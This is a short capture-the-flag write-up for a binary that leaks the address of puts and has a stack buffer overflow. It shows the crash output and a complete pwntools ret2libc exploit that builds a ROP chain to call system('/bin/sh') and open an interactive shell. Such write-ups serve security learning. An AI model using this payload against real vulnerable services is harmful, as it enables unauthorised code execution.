# Chal 2

## Solution

The concept of this challenge is simple. It prints the address of `puts` and then reads in a string that is subject to a buffer overflow.
```
Welcome to the challenge
The address of puts: 0x7f13fd70b390
Provide some input >>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Thus, the strategy is to run a basic ret2libc exploit. The exploit is as follows:
```python
p = start()
p.recvuntil(b"puts: 0x")
puts_addr = int(p.recv(12), 16)
log.info(f"Got leaked puts address: {hex(puts_addr)}")
libc.address = puts_addr - libc.sym['puts']

r = ROP(libc)
payload = cyclic(72)
payload += p64(r.find_gadget(['ret'])[0])
payload += p64(r.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'>>>', payload)

p.interactive()
```